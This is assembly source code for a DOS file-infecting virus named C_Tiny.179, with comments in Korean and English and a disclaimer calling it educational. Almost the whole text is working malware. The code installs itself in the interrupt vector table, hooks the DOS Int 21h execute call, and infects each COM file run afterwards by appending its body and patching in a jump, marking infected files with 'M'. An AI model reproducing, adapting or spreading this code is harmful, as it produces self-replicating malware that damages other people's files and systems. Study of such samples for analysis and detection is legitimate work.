;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;     C_Tiny.179                              \          \     \   \
;                                             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : C_Tiny.179
; Author     : Osiris
; Origin     : Corea
; Date       : 1997/12/07
;
; Type : Memory resident  COM
;
; !****************************************************************************!
; *                                                                            *
; * 경고 !                                                                     *
; *    이것은 바이러스 소스 코드이다. 교육적인 목적으로만 사용되어야한다.      *
; *    제작자는 이 소스코드로 야기되는 어떠한 문제에 대해서도 책임을 지지 않   *
; *    는다. 변형 하거나 실행하지 말라 !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
; 간단한 램상주 바이러스로 인터럽트 벡터 주소표에 상주한다. (0020:0000)
; 바이러스 상주전 이 영역에 데이터가 전혀 없어야 하다. 만약 이영역에 0 이 아닌
; 다른 값이 저장되어 있다면 바이러스는 기억장소에 상주 하지 않는다.
; 그리고, COM 파일만 감염시키며 감염 여부는 파일의 첫 부분이 'M' 인지 비교 한다
;
; 항상 첫 버전은 테스트 버전이다. 진단을 피하기 위한 어떤 기교도 사용하지 않았
; 다.
;
; 인터럽트 벡터 테이블에 상주 하는 바이러스는 크기가 아주 작아야 한다.
;
; 본격적인 램상주 바이러스 제작에 앞서 제한적인 램상주방법인 인터럽트벡터 테이
; 블에 상주 하는 바이러스이다.
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE
            .286

 C_Tiny:
            DB    0E8h,00,00            ;
            pop   si                    ; 바이러스 시작점 구하기
            sub   si,0003               ; SI = 바이러스 시작점

            push  si                    ; 저장
            xor   di,DI                 ;
            mov   ds,DI
            mov   cx, offset End_Virus  ; 바이러스 길이 만큼 비교

 Check_IVT_Zero:
            cmp   byte ptr [DI+200h],0  ; 인터럽트 주소표가 0 인지 비교한다.
            jnz   Restore_COM_Head      ; 만약 어떤 값이 라도 0 이 아닌 경우는
            inc   DI                    ; 기억장소에 상주 하지 않는다
            loop  Check_IVT_Zero        ;

 Copy_Vir_IVT:
            mov   ax,0020h              ;
            mov   es,ax                 ;
            mov   cx, offset End_Virus  ; 바이러스 길이
            xor   di,di                 ; 복사 할 곳 (0020:0000h)
            db    2Eh                   ; CS:SI -> ES:DI
            repz  movsb                 ; 복사 !

            mov   si, 0084h             ; Int 21h 주소값 얻기
            mov   di, offset Jmp_Org_Int21 + 1
            push  si
            movsw
            movsw

            pop   si                    ;
            cli                         ; Int 21h 가로채기
            mov   word ptr [SI], offset NewInt21
            mov   word ptr [SI+2], 0020h
            sti

 Restore_COM_Head:
            push  cs                    ; cs=ds=es
            pop   ds
            push  cs
            pop   es
            pop   si                    ; SI 복구
            add   si, offset OldCOMHead ; COM 앞부분 주소 계산
            mov   di,100h               ; COM 앞부분 복구
            push  di                    ;
            movsw                       ; 4 바이트 복구
            movsw                       ;
            ret                         ;

 OldCOMHead db    90h,90h,0CDh,20h      ; 원래 COM 앞부분
            db   'C_Tiny'               ; 바이러스 이름

 NewInt21:
            cmp   ah,4bh                ; 실행인가 ?
            jnz   Jmp_Org_Int21

            pusha                       ; 286 + 에서 지원
            push  ds
            push  es

            mov   ax, 3D02h             ; 파일 오픈
            int   21h
            jc    Error

            xchg  ax,bx                 ; 핸들 얻기

            push  cs                    ; 세그먼트 통일
            pop   ds
            push  cs
            pop   es

            mov   ah, 3fh               ; 파일 읽기
            mov   cx, 4                 ; 바이트수
            mov   dx, offset OldCOMHead ; 주소값
            int   21h

            cmp   byte ptr OldCOMHead, 'M' ; 감염되었나 / EXE 파일인가 ?
            jz    Close

            mov   ax,4202h              ; 파일 끝으로 이동
            xor   cx,cx
            xor   dx,dx
            int   21h

            mov   word ptr Jump_Code, 0E94Dh

            sub   ax,0004               ; 점프값 계산
            mov   word ptr Jump_Code + 2, ax

            mov   ah, 40h               ; 바이러스 쓰기
            mov   cx, offset End_Virus
            xor   dx,dx
            int   21h

            mov   ax,4200h              ; 파일 처음으로 이동
            xor   cx,cx
            xor   dx,dx
            int   21h

            mov   ah, 40h               ; 앞부분 쓰기
            mov   cx, 4
            mov   dx, offset Jump_Code
            int   21h

 Close:
            mov   ah,3Eh                ; 파일 닫기
            int   21h
 Error:
            pop   es
            pop   ds
            popa
 Jmp_Org_Int21:
            db    0EAh                  ;
 End_Virus:
            dw    ?,?                   ;

 Jump_Code  dw    ?                     ; M, E9h
            db    ?,?                   ; 점프 값

 End_Memory:
            END   C_Tiny

